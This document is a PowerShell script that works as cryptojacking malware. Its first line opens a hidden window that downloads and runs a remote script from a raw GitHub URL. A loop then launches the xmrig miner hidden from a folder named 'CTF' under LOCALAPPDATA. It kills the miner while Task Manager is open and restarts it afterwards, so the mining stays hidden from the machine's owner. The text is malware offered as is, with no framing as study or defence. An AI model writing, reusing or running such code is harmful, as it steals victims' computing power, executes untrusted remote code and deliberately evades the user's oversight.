powershell -windowstyle hidden -Command "Invoke-Expression (Invoke-REstMethod -Uri 'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt')"
$ativoprocess = $false
$ativotask = $null

while ($true){
    Start-Sleep -Seconds 1
    try {
        Get-Process taskmgr -ErrorAction Stop
        $ativotask = $true
        try{Stop-Process -name Xmrig -ErrorAction Stop}
        catch{}
        $ativoprocess = $false 
    }
    catch {
       $ativotask = $false 
       try{
            Get-Process Xmrig -ErrorAction Stop
            $ativoprocess = $true
       }
       catch{
            if($ativoprocess -eq $false){
                Start-Process -FilePath "$env:LOCALAPPDATA\CTF\xmrig.exe" -WindowStyle Hidden
                $ativoprocess = $true
            }
            else{
                $ativoprocess = $false
                Start-Sleep -Seconds 3
            }
       }
    }
}

